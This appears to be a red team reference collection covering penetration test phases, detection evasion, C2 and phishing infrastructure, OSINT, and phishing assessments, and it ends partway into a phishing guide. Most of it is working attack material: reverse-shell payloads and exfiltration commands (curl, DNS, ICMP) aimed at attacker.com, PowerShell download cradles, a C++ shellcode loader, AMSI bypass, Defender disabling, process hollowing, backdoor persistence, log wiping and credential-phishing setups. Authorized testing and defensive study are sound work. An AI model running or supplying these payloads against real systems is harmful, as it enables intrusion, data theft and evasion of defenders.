# Red Team Playbook, OSINT and Social Engineering

> Source: [Vyber07/cyber-security](https://huggingface.co/datasets/Vyber07/cyber-security) on Hugging Face (Apache-2.0). Community-curated reference; verify commands and versions before use.

## Contents

- Provide a complete red team playbook covering all phases of a penetration test.
- What are the techniques for evading detection during a red team engagement?
- How do I set up a red team infrastructure?
- How to perform OSINT reconnaissance on a target organization?
- How to conduct a phishing awareness assessment?
- Provide a comprehensive guide to phishing attacks, defenses, and detection methods.
- How do I create phishing awareness training programs?

## Provide a complete red team playbook covering all phases of a penetration test.

#### Complete Red Team Playbook

##### Phase 1: Planning and Reconnaissance

###### 1.1 Rules of Engagement
**Authorization:**
- Written authorization from client
- Scope definition (in-scope/out-of-scope)
- Timeline and working hours
- Emergency contacts
- Legal agreements

**Scope Definition:**
- IP ranges
- Domains
- Applications
- Physical locations
- Social engineering targets

###### 1.2 Passive Reconnaissance

**OSINT Gathering:**
```bash
# Domain enumeration
amass enum -d target.com -passive
subfinder -d target.com
assetfinder target.com

# Email harvesting
theHarvester -d target.com -b all

# Social media
linkedin2username target.com

# Code repositories
trufflehog github --org target

# Cloud resources
cloud_enum -k target.com
```

**Tools:**
- Maltego: Visual link analysis
- Recon-ng: Reconnaissance framework
- SpiderFoot: OSINT automation
- Shodan: Internet-connected device search
- Censys: Internet asset discovery
- theHarvester: Email/subdomain enumeration

###### 1.3 Active Reconnaissance

**Network Scanning:**
```bash
# Host discovery
nmap -sn 10.0.0.0/24

# Port scanning
nmap -sS -sV -sC -O target.com
masscan -p1-65535 target.com --rate 1000

# Service enumeration
nmap -sV -p 80,443,8080,8443 target.com

# Vulnerability scanning
nmap --script vuln target.com
```

**Web Application Reconnaissance:**
```bash
# Directory enumeration
feroxbuster -u http://target.com -w wordlist.txt
gobuster dir -u http://target.com -w wordlist.txt

# Technology identification
whatweb target.com
wappalyzer target.com

# JavaScript analysis
linkfinder -i http://target.com -o cli
secretfinder -i http://target.com/app.js -e
```

##### Phase 2: Vulnerability Assessment

###### 2.1 Automated Scanning

**Network Vulnerability Scanning:**
```bash
# Nessus scan
nessuscli scan new -T target.com -p all

# OpenVAS scan
openvasmd --create-target --target-hosts target.com
openvasmd --create-task --target target --scan-config Full
```

**Web Application Scanning:**
```bash
# Nikto scan
nikto -h http://target.com

# OWASP ZAP
zap-cli quick-scan -s all -r http://target.com

# Burp Suite
# Configure proxy, crawl, and scan
```

###### 2.2 Manual Testing

**Web Application Testing:**
```bash
# SQL injection
sqlmap -u "http://target.com/page?id=1" --dbs

# XSS testing
# Manual payload injection

# Authentication testing
# Brute force, credential stuffing

# Authorization testing
# IDOR, privilege escalation
```

**Network Testing:**
```bash
# SMB enumeration
smbclient -L //target.com/
smbmap -H target.com

# LDAP enumeration
ldapsearch -h target.com -x -b "dc=target,dc=com"

# Kerberos enumeration
impacket-GetUserSPNs target.com/user:password
```

##### Phase 3: Exploitation

###### 3.1 Network Exploitation

**Metasploit Framework:**
```bash
# Search for exploits
msfconsole
search type:exploit platform:windows

# Exploit selection
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target.com
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker.com
exploit
```

**Impacket:**
```bash
# Pass-the-Hash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:da76f... target.com

# Pass-the-Ticket
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache

# DCSync
impacket-secretsdump target.com/user:password@dc.target.com
```

###### 3.2 Web Application Exploitation

**SQL Injection:**
```bash
# Automated exploitation
sqlmap -u "http://target.com/page?id=1" --os-shell

# Manual exploitation
# Union-based, blind, time-based
```

**Remote Code Execution:**
```bash
# File upload exploitation
# Command injection
# Deserialization attacks
# SSRF exploitation
```

**Authentication Bypass:**
```bash
# Default credentials
# Credential brute force
# Session hijacking
# Token manipulation
```

###### 3.3 Client-Side Attacks

**Phishing:**
```bash
# Email phishing
setoolkit
# Select Social-Engineering Attacks -> Spear-Phishing Attack

# Credential harvesting
# Clone website
setoolkit
# Select Website Attack Vectors -> Credential Harvester Attack
```

**Malware Delivery:**
```bash
# Payload generation
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f exe > payload.exe

# Macro generation
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f vba-payload
```

##### Phase 4: Post-Exploitation

###### 4.1 Privilege Escalation

**Windows Privilege Escalation:**
```bash
# Automated enumeration
winPEAS.exe
PowerUp.ps1
JAWS.ps1

# Manual checks
whoami /all
systeminfo
net user
net localgroup administrators

# Exploitation
# Token manipulation
# Service exploitation
# Registry exploitation
# Scheduled task exploitation
```

**Linux Privilege Escalation:**
```bash
# Automated enumeration
linpeas.sh
linux-exploit-suggester.sh

# Manual checks
id
sudo -l
cat /etc/passwd
find / -perm -4000 2>/dev/null

# Exploitation
# Sudo exploitation
# SUID exploitation
# Kernel exploitation
# Cron job exploitation
```

###### 4.2 Lateral Movement

**Windows Lateral Movement:**
```bash
# Pass-the-Hash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:da76f... target.com

# Pass-the-Ticket
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache

# WMI execution
impacket-wmiexec target.com/user:password@target.com

# PowerShell remoting
Enter-PSSession -ComputerName target.com -Credential $cred
```

**Linux Lateral Movement:**
```bash
# SSH key-based access
ssh -i key.pem user@target.com

# SSH tunneling
ssh -L 8080:internal.target.com:80 user@target.com

# Rsync/SFTP
rsync -avz user@target.com:/data /local/data
```

###### 4.3 Persistence

**Windows Persistence:**
```bash
# Registry persistence
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v backdoor /d "C:\backdoor.exe"

# Scheduled task persistence
schtasks /create /tn backdoor /tr C:\backdoor.exe /sc daily

# Service persistence
sc create backdoor binpath= "C:\backdoor.exe"

# DLL hijacking
# Plant malicious DLL in search order
```

**Linux Persistence:**
```bash
# Cron job persistence
crontab -e
# Add: @reboot /tmp/backdoor

# SSH key persistence
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# Systemd service persistence
[Unit]
Description=Backdoor
[Service]
ExecStart=/tmp/backdoor
[Install]
WantedBy=multi-user.target
```

###### 4.4 Data Exfiltration

**Data Collection:**
```bash
# File system enumeration
find / -name "*.docx" -o -name "*.xlsx" -o -name "*.pdf"

# Database extraction
mysqldump -u root -p database > database.sql
pg_dump database > database.sql

# Memory extraction
procdump -ma lsass.exe lsass.dmp
```

**Exfiltration Methods:**
```bash
# DNS exfiltration
cat data.txt | base64 | while read line; do nslookup $line.exfil.attacker.com; done

# HTTP exfiltration
curl -X POST -d @data.txt http://attacker.com/exfil

# ICMP exfiltration
ping -p $(cat data.txt | xxd -p) attacker.com

# Steganography
steghide embed -cf image.jpg -ef data.txt
```

##### Phase 5: Command and Control

###### 5.1 C2 Frameworks

**Cobalt Strike:**
```bash
# Team server setup
./teamserver attacker.com password

# Beacon configuration
# Create listener
# Generate payload
# Deploy and manage beacons
```

**Empire:**
```bash
# Empire setup
./empire

# Listener creation
uselistener http
set Host attacker.com
execute

# Stager generation
usestager multi/launcher
set Listener http
generate
```

**Sliver:**
```bash
# Sliver setup
./sliver-server

# Generate implant
generate --mtls attacker.com --os windows --arch amd64

# Session management
sessions
use [session_id]
```

###### 5.2 Communication Channels

**HTTP/HTTPS:**
- Standard web traffic
- Domain fronting
- Protocol tunneling

**DNS:**
- DNS tunneling
- DNS over HTTPS
- Domain generation algorithms

**Social Media:**
- Twitter C2
- GitHub Gists
- Slack/Discord webhooks

##### Phase 6: Reporting

###### 6.1 Vulnerability Documentation
**Format:**
1. Vulnerability title
2. Affected systems
3. CVSS score
4. Attack vector
5. Impact
6. Proof of concept
7. Remediation steps

###### 6.2 Attack Path Documentation
**Format:**
1. Initial access
2. Lateral movement
3. Privilege escalation
4. Data access
5. Persistence mechanisms
6. Detection evasion

###### 6.3 Executive Summary
**Content:**
- Overall risk assessment
- Key findings
- Business impact
- Recommendations
- Prioritized remediation

##### Tools Reference

###### Reconnaissance
- Amass: Attack surface mapping
- Subfinder: Subdomain discovery
- theHarvester: Email/subdomain enumeration
- Maltego: Visual link analysis
- Shodan: Internet device search

###### Vulnerability Scanning
- Nessus: Vulnerability scanner
- OpenVAS: Open-source scanner
- Nikto: Web server scanner
- OWASP ZAP: Web app scanner
- Burp Suite: Web app testing

###### Exploitation
- Metasploit: Exploitation framework
- Impacket: Windows protocol toolkit
- CrackMapExec: Network exploitation
- SQLMap: SQL injection tool
- Commix: Command injection tool

###### Post-Exploitation
- Mimikatz: Credential extraction
- BloodHound: AD attack path
- PowerSploit: PowerShell post-exploitation
- Covenant: .NET C2 framework
- Rubeus: Kerberos abuse

###### C2 Frameworks
- Cobalt Strike: Commercial C2
- Empire: PowerShell C2
- Sliver: Go-based C2
- Mythic: Cross-platform C2
- Havoc: Modern C2 framework

###### Evasion
- Veil: Payload generator
- Shellter: Dynamic shellcode injection
- Donut: .NET assembly injection
- AMSI bypass techniques
- ETW patching

## What are the techniques for evading detection during a red team engagement?

#### Red Team Detection Evasion Techniques

##### 1. Payload Evasion

###### 1.1 Payload Obfuscation

**String Obfuscation:**
```python
# Base64 encoding
import base64
payload = b"malicious code"
encoded = base64.b64encode(payload)

# XOR encoding
def xor_encode(data, key):
    return bytes([b ^ key for b in data])

# AES encryption
from Crypto.Cipher import AES
cipher = AES.new(key, AES.MODE_EAX)
ciphertext, tag = cipher.encrypt_and_digest(payload)
```

**Code Obfuscation:**
```python
# Variable renaming
# Control flow obfuscation
# Dead code insertion
# String splitting
```

###### 1.2 Payload Delivery

**Staged Payloads:**
```bash
# Stage 1: Small loader
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker.com LPORT=443 -f exe > stage1.exe

# Stage 2: Full payload delivered via stage 1
```

**Fileless Execution:**
```powershell
# PowerShell download cradle
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"

# Reflective loading
powershell -ep bypass -c "[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest http://attacker.com/implant.dll).Content)"
```

###### 1.3 Custom Loaders

**C++ Loader Example:**
```cpp
#include <windows.h>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")

int main() {
    // Download payload
    HINTERNET hInternet = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    HINTERNET hUrl = InternetOpenUrl(hInternet, "http://attacker.com/payload.bin", NULL, 0, INTERNET_FLAG_NO_CACHE_WRITE, 0);
    
    // Read payload
    char buffer[4096];
    DWORD bytesRead;
    InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead);
    
    // Execute payload
    void* exec = VirtualAlloc(0, bytesRead, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buffer, bytesRead);
    ((void(*)())exec)();
    
    return 0;
}
```

##### 2. Execution Evasion

###### 2.1 Living-off-the-Land Binaries (LOLBins)

**PowerShell:**
```powershell
# Constrained Language Mode bypass
powershell -ep bypass -c "..."

# AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# ETW patching
$etw = [System.Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance')
```

**MSBuild:**
```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Fragment" Language="cs">
        System.Diagnostics.Process.Start("cmd.exe", "/c calc.exe");
      </Code>
    </Task>
  </UsingTask>
</Project>
```

**Regsvr32:**
```bash
# SCT file execution
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
```

###### 2.2 Process Injection

**DLL Injection:**
```cpp
// Open target process
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

// Allocate memory
LPVOID pDllPath = VirtualAllocEx(hProcess, 0, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

// Write DLL path
WriteProcessMemory(hProcess, pDllPath, dllPath, bufferSize, 0);

// Create remote thread
HANDLE hThread = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA"), pDllPath, 0, 0);
```

**Process Hollowing:**
```cpp
// Create suspended process
CreateProcess(NULL, "svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// Unmap original code
NtUnmapViewOfSection(pi.hProcess, baseAddress);

// Allocate new memory
VirtualAllocEx(pi.hProcess, baseAddress, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

// Write new code
WriteProcessMemory(pi.hProcess, baseAddress, maliciousCode, imageSize, 0);

// Resume process
ResumeThread(pi.hThread);
```

##### 3. Defense Evasion

###### 3.1 AMSI Bypass

**PowerShell AMSI Bypass:**
```powershell
# Method 1: Reflection
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Method 2: Patching
$kernel32 = Add-Type -MemberDefinition '[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);' -Name 'Kernel32' -Namespace 'Win32' -PassThru
$amsi = $kernel32::GetProcAddress([IntPtr]::Zero, 'AmsiScanBuffer')
# Patch to return E_FAIL
```

###### 3.2 ETW Patching
```powershell
# Disable ETW
$etw = [System.Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance')
$etw.SetValue($null, $false)
```

###### 3.3 Defender Evasion

**Exclusion Paths:**
```powershell
# Add exclusion
Add-MpPreference -ExclusionPath "C:\temp"

# Disable real-time monitoring
Set-MpPreference -DisableRealtimeMonitoring $true
```

**Signature Evasion:**
```bash
# Veil framework
use evasion/meterpreter/rev_https.py

# Shellter
shellter -a -p payload.exe

# Custom payloads
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker.com LPORT=443 -e x64/xor_dynamic -i 5 -f exe > payload.exe
```

##### 4. Network Evasion

###### 4.1 Protocol Tunneling

**DNS Tunneling:**
```bash
# dnscat2
dnscat2-server attacker.com
# On target:
dnscat2-client attacker.com

# iodine
iodined -f 10.0.0.1 attacker.com
# On target:
iodine attacker.com
```

**HTTP Tunneling:**
```bash
# Chisel
# Server:
chisel server --reverse --port 8080
# Client:
chisel client attacker.com:8080 R:socks

# ReGeorg
python reGeorgSocksProxy.py -p 8080 -u http://target.com/tunnel.aspx
```

###### 4.2 Domain Fronting
```bash
# Use CDN for C2
# Configure C2 to use legitimate CDN domain
# Front through legitimate service
```

###### 4.3 Traffic Blending

**Mimic Legitimate Traffic:**
```bash
# Use common user agents
# Standard HTTP methods
# Normal request patterns
# Blend with legitimate traffic
```

##### 5. Persistence Evasion

###### 5.1 Stealthy Persistence

**Registry Persistence:**
```bash
# Use non-standard keys
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "OneDrive" /d "C:\Users\user\AppData\Local\Microsoft\OneDrive\OneDrive.exe"
```

**Scheduled Task Evasion:**
```bash
# Use legitimate task names
schtasks /create /tn "Microsoft\Windows\WindowsUpdate" /tr C:\backdoor.exe /sc daily
```

**WMI Persistence:**
```powershell
# WMI event subscription
$filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{Name="UpdateFilter"; EventNamespace="root\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}
```

###### 5.2 Rootkit Techniques

**User-Mode Rootkit:**
```cpp
// API hooking
// DLL injection
// Process hiding
```

**Kernel-Mode Rootkit:**
```cpp
// Driver loading
// SSDT hooking
// IRP hooking
// DKOM (Direct Kernel Object Manipulation)
```

##### 6. Credential Evasion

###### 6.1 Credential Guard Bypass

**Techniques:**
- LSASS memory dumping
- SAM database extraction
- DCSync attacks
- Kerberoasting

**Tools:**
- Mimikatz
- Impacket
- Rubeus
- SharpKatz

###### 6.2 MFA Bypass

**Techniques:**
- Session hijacking
- Token theft
- Real-time phishing
- SIM swapping

##### 7. Logging Evasion

###### 7.1 Log Tampering

**Windows Event Logs:**
```powershell
# Clear event logs
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
```

**Linux Logs:**
```bash
# Clear logs
> /var/log/auth.log
> /var/log/syslog

# Modify timestamps
touch -t 202301010000 /path/to/file
```

###### 7.2 Log Avoidance

**Techniques:**
- Use legitimate tools
- Avoid logging mechanisms
- Execute in memory
- Use encrypted channels

##### 8. Anti-Forensics

###### 8.1 Evidence Destruction

**File System:**
```bash
# Secure deletion
cipher /w:C:\temp
shred -vfz -n 5 /tmp/evidence

# Timestamp manipulation
# MFT manipulation
```

**Memory:**
```bash
# Memory wiping
# Process hollowing
# Anti-dump techniques
```

###### 8.2 Timestomping
```bash
# Modify timestamps
$t = Get-Date "01/01/2023 00:00"
(Get-Item file.txt).LastWriteTime = $t
(Get-Item file.txt).CreationTime = $t
```

##### 9. Detection Evasion Tools

###### 9.1 Payload Generation
- Veil: Payload generator
- Shellter: Dynamic injection
- Donut: .NET assembly injection
- ScareCrow: Payload generator

###### 9.2 C2 Frameworks
- Cobalt Strike: Commercial C2 with evasion
- Sliver: Go-based C2
- Mythic: Cross-platform C2
- Havoc: Modern C2

###### 9.3 Evasion Frameworks
- SharpSploit: .NET evasion
- PowerSploit: PowerShell evasion
- Inveigh: MITM attacks
- KrbRelayUp: Kerberos relay

##### 10. Best Practices for Evasion

###### 10.1 Operational Security
- Use VPN/Tor for operations
- Separate infrastructure
- Use legitimate services
- Avoid patterns

###### 10.2 Testing
- Test against target EDR
- Validate evasion techniques
- Document successful methods
- Update techniques regularly

###### 10.3 Documentation
- Track evasion methods
- Note detection gaps
- Recommend improvements
- Share with blue team

## How do I set up a red team infrastructure?

#### Red Team Infrastructure Setup Guide

##### 1. Infrastructure Architecture

###### 1.1 Core Components

**Attack Infrastructure:**
- Command and Control (C2) servers
- Phishing infrastructure
- Payload delivery servers
- Redirectors

**Support Infrastructure:**
- DNS servers
- VPN servers
- Proxy servers
- Monitoring systems

###### 1.2 Network Architecture

**DMZ Layer:**
- Redirectors
- Load balancers
- Web servers

**C2 Layer:**
- C2 servers
- Team servers
- Listener management

**Management Layer:**
- VPN access
- Monitoring
- Logging

##### 2. Server Setup

###### 2.1 Domain Configuration

**Domain Registration:**
```bash
# Register domains similar to target
# Use privacy protection
# Register for appropriate duration

# Example domains:
# target-login.com
# target-support.com
# target-cdn.com
```

**DNS Configuration:**
```bash
# A records
dig A c2.target-cdn.com
# Returns: 1.2.3.4

# MX records
dig MX target-cdn.com
# Returns: mail.target-cdn.com

# TXT records (for SPF/DKIM)
dig TXT target-cdn.com
```

###### 2.2 Server Provisioning

**Cloud Providers:**
```bash
# AWS
aws ec2 run-instances --image-id ami-12345678 --instance-type t3.medium --key-name redteam

# DigitalOcean
doctl compute droplet create c2-server --size s-1vcpu-2gb --image ubuntu-20-04 --region nyc1

# Vultr
vultr instance create --plan vc2-1c-2gb --os 387 --region ewr
```

**VPS Providers:**
- OVH: Offshore hosting
- BuyVM: Privacy-friendly
- Njalla: Anonymous hosting
- 1984: Privacy-focused hosting

###### 2.3 Server Hardening

**Initial Setup:**
```bash
# Update system
apt update && apt upgrade -y

# Install security tools
apt install -y fail2ban ufw

# Configure firewall
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp
ufw allow 80/tcp
ufw allow 443/tcp
ufw enable

# Configure fail2ban
systemctl enable fail2ban
systemctl start fail2ban
```

**SSH Hardening:**
```bash
# Edit /etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
Port 2222

# Restart SSH
systemctl restart sshd
```

##### 3. C2 Infrastructure

###### 3.1 Cobalt Strike Setup

**Team Server:**
```bash
# Install Java
apt install -y openjdk-11-jdk

# Extract Cobalt Strike
tar xzf cobaltstrike-dist.tgz
cd cobaltstrike

# Start team server
./teamserver 1.2.3.4 password c2.profile
```

**Listener Configuration:**
```bash
# HTTP listener
# Host: c2.target-cdn.com
# Port: 80
# Beacon: windows/beacon_http/reverse_http

# HTTPS listener
# Host: c2.target-cdn.com
# Port: 443
# Beacon: windows/beacon_https/reverse_https

# DNS listener
# Host: ns1.target-cdn.com
# Port: 53
# Beacon: windows/beacon_dns/reverse_dns_txt
```

###### 3.2 Empire Setup

**Installation:**
```bash
# Clone Empire
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire

# Install dependencies
./setup/install.sh

# Start Empire
./empire --rest --username admin --password password
```

**Listener Setup:**
```bash
# HTTP listener
uselistener http
set Host http://c2.target-cdn.com
set Port 80
execute

# HTTPS listener
uselistener https
set Host https://c2.target-cdn.com
set Port 443
set CertPath /path/to/cert.pem
execute
```

###### 3.3 Sliver Setup

**Installation:**
```bash
# Download Sliver
curl https://sliver.sh/install|sudo bash

# Start server
sliver-server

# Generate implant
generate --mtls c2.target-cdn.com --os windows --arch amd64 --save /tmp/implant.exe

# Start listener
mtls --lhost 0.0.0.0 --lport 443
```

##### 4. Redirector Setup

###### 4.1 Apache Redirector

**Configuration:**
```apache
<VirtualHost *:80>
    ServerName c2.target-cdn.com
    
    # Redirect legitimate traffic
    RewriteEngine On
    RewriteCond %{REQUEST_URI} ^/api/.*
    RewriteRule ^(.*)$ http://c2-server:8080$1 [P,L]
    
    # Block non-Teamserver traffic
    <Location />
        Require all denied
    </Location>
    
    <Location /api/>
        Require all granted
    </Location>
</VirtualHost>
```

###### 4.2 Nginx Redirector

**Configuration:**
```nginx
server {
    listen 80;
    server_name c2.target-cdn.com;
    
    location /api/ {
        proxy_pass http://c2-server:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
    
    location / {
        return 403;
    }
}
```

###### 4.3 CDN Redirector

**Cloudflare Setup:**
```bash
# Configure Cloudflare
# Point domain to C2 server
# Enable proxy
# Configure firewall rules
```

##### 5. Phishing Infrastructure

###### 5.1 Email Setup

**Domain Configuration:**
```bash
# Configure SPF
dig TXT target-cdn.com
# v=spf1 include:_spf.google.com ~all

# Configure DKIM
# Generate DKIM key
# Add DKIM record

# Configure DMARC
dig TXT _dmarc.target-cdn.com
# v=DMARC1; p=reject; rua=mailto:dmarc@target-cdn.com
```

**Mail Server:**
```bash
# Install Postfix
apt install -y postfix

# Configure Postfix
# Edit /etc/postfix/main.cf
myhostname = mail.target-cdn.com
mydomain = target-cdn.com
myorigin = $mydomain
inet_interfaces = all

# Start Postfix
systemctl enable postfix
systemctl start postfix
```

###### 5.2 Phishing Tools

**GoPhish:**
```bash
# Install GoPhish
curl -L https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip -o gophish.zip
unzip gophish.zip
chmod +x gophish

# Configure GoPhish
# Edit config.json
{
    "admin_server": {
        "listen_url": "0.0.0.0:3333",
        "use_tls": true,
        "cert_path": "gophish_admin.crt",
        "key_path": "gophish_admin.key"
    },
    "phish_server": {
        "listen_url": "0.0.0.0:80",
        "use_tls": false
    }
}

# Start GoPhish
./gophish
```

**EvilGinx2:**
```bash
# Install EvilGinx2
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make

# Configure EvilGinx2
./evilginx2
config domain target-cdn.com
config ipv4 1.2.3.4
```

##### 6. Payload Delivery

###### 6.1 Payload Hosting

**HTTP Server:**
```bash
# Python HTTP server
python3 -m http.server 8080

# Nginx
apt install -y nginx
# Configure for payload delivery
```

**CDN Integration:**
```bash
# Use legitimate CDNs
# GitHub raw content
# GitLab raw content
# Google Drive
# OneDrive
```

###### 6.2 Payload Generation

**Metasploit Payloads:**
```bash
# Windows payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=c2.target-cdn.com LPORT=443 -f exe > payload.exe

# Office macro
msfvenom -p windows/meterpreter/reverse_https LHOST=c2.target-cdn.com LPORT=443 -f vba-payload

# HTA payload
msfvenom -p windows/meterpreter/reverse_https LHOST=c2.target-cdn.com LPORT=443 -f hta-psh
```

##### 7. Monitoring and Logging

###### 7.1 Infrastructure Monitoring

**Server Monitoring:**
```bash
# Install monitoring tools
apt install -y prometheus grafana

# Configure Prometheus
# Edit /etc/prometheus/prometheus.yml
scrape_configs:
  - job_name: 'node'
    static_configs:
      - targets: ['localhost:9100']

# Configure Grafana
# Access http://localhost:3000
```

**Network Monitoring:**
```bash
# Install Wireshark/tshark
apt install -y tshark

# Capture traffic
tshark -i eth0 -w capture.pcap
```

###### 7.2 Operational Logging

**Activity Logging:**
```bash
# Log all operations
# Timestamp, action, target, result

# Secure logging
# Encrypt logs
# Store offsite
```

##### 8. Security and OPSEC

###### 8.1 Infrastructure Security

**Access Control:**
```bash
# VPN access only
# Multi-factor authentication
# IP whitelisting
# Regular access reviews
```

**Regular Maintenance:**
```bash
# Update systems
apt update && apt upgrade -y

# Rotate credentials
# Review logs
# Check for compromises
```

###### 8.2 Operational Security

**IP Management:**
```bash
# Use different IPs for different operations
# Rotate IPs regularly
# Use residential proxies
# Avoid blacklisted IPs
```

**Domain Management:**
```bash
# Use different domains for different operations
# Age domains before use
# Use privacy protection
# Monitor domain reputation
```

##### 9. Cleanup

###### 9.1 Infrastructure Teardown
```bash
# Destroy servers
# Delete DNS records
# Transfer/expire domains
# Securely delete logs
```

###### 9.2 Evidence Preservation
```bash
# Preserve engagement evidence
# Archive logs
# Document findings
# Client handoff
```

##### 10. Tools Reference

###### 10.1 C2 Frameworks
- Cobalt Strike: Commercial C2
- Empire: PowerShell C2
- Sliver: Go-based C2
- Mythic: Cross-platform C2
- Havoc: Modern C2

###### 10.2 Phishing Tools
- GoPhish: Phishing framework
- EvilGinx2: Phishing toolkit
- SET: Social Engineering Toolkit
- King Phisher: Phishing framework

###### 10.3 Infrastructure Tools
- Terraform: Infrastructure as code
- Ansible: Configuration management
- Docker: Containerization
- Nginx: Web server/reverse proxy

###### 10.4 Monitoring Tools
- Prometheus: Metrics collection
- Grafana: Visualization
- ELK Stack: Log management
- Wireshark: Packet analysis

## How to perform OSINT reconnaissance on a target organization?

#### OSINT Reconnaissance Guide

##### Domain Enumeration
```bash
# Subdomain discovery
subfinder -d example.com
amass enum -d example.com
assetfinder --subs-only example.com

# DNS enumeration
dnsrecon -d example.com
dnsenum example.com

# Certificate transparency
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u
```

##### Email Harvesting
```bash
# theHarvester
theHarvester -d example.com -b google,bing,linkedin

# Hunter.io
# Search for email patterns

# LinkedIn scraping
# Look for employee names and roles
```

##### Social Media
```bash
# Twitter/X
# Search for company mentions, employee posts

# LinkedIn
# Employee enumeration
# Technology stack identification

# GitHub
# Search for company repositories
# Look for exposed secrets
trufflehog https://github.com/example-org

# Search for code
github-dork -t <token> -d example.com
```

##### Technology Fingerprinting
```bash
# Web technology detection
whatweb https://example.com
wappalyzer https://example.com

# CMS detection
cmseek -u https://example.com

# Framework detection
# Look for:
- HTTP headers
- HTML meta tags
- JavaScript libraries
- Cookie names
```

##### Infrastructure Mapping
```bash
# IP discovery
nmap -sn example.com

# ASN lookup
whois -h whois.radb.net -- '-i origin AS12345'

# Shodan
shodan search 'org:Example ssl.cert.subject.CN:example.com'

# Censys
censys search 'example.com'

# Wayback Machine
curl -s "http://web.archive.org/cdx/search/cdx?url=example.com/*&output=text&fl=original"
```

##### Leak Detection
```bash
# Check for data breaches
# haveibeenpwned.com

# Check for paste leaks
# pastebin.com search

# Check for code leaks
# GitHub search
# GitLab search
```

##### Tools
- subfinder
- amass
- theHarvester
- Shodan
- Censys
- trufflehog
- Recon-ng
- Maltego

## How to conduct a phishing awareness assessment?

#### Phishing Awareness Assessment

##### Planning Phase
```
1. Define objectives
   - Test email security awareness
   - Measure click-through rates
   - Identify training needs

2. Select targets
   - All employees
   - High-risk departments
   - Executive leadership

3. Design templates
   - Credential harvesting
   - Malicious attachments
   - Link-based attacks
```

##### Infrastructure Setup
```bash
# Set up GoPhish
docker run -d -p 3333:3333 gophish/gophish

# Configure sending domain
# Set up SPF, DKIM, DMARC

# Create landing pages
# Clone legitimate login pages
```

##### Campaign Templates
```html
<!-- IT Support Phishing -->
Subject: Urgent: Password Reset Required
From: IT Support <it@company.com>
Body: Your password expires today. Click here to reset.

<!-- Package Delivery -->
Subject: Package Delivery Notification
From: FedEx <delivery@fedex.com>
Body: Your package is ready for delivery. Track here.

<!-- Invoice -->
Subject: Outstanding Invoice #12345
From: Accounting <accounting@company.com>
Body: Please review the attached invoice.
```

##### Metrics to Track
```
- Email open rate
- Link click rate
- Credential submission rate
- Attachment open rate
- Report rate (who reported)
- Time to report
```

##### Post-Campaign Actions
```
1. Immediate notification to clickers
2. Training for those who submitted credentials
3. Organization-wide awareness training
4. Policy updates if needed
5. Report to management
```

##### Tools
- GoPhish
- King Phisher
- Lucy Security
- KnowBe4
- Cofense

## Provide a comprehensive guide to phishing attacks, defenses, and detection methods.

#### Comprehensive Phishing Attack and Defense Guide

##### Phishing Attack Types

###### 1. Email Phishing

**Characteristics:**
- Mass distribution
- Generic content
- Urgent language
- Suspicious links/attachments

**Techniques:**
- Spoofed sender addresses
- Lookalike domains
- URL shortening
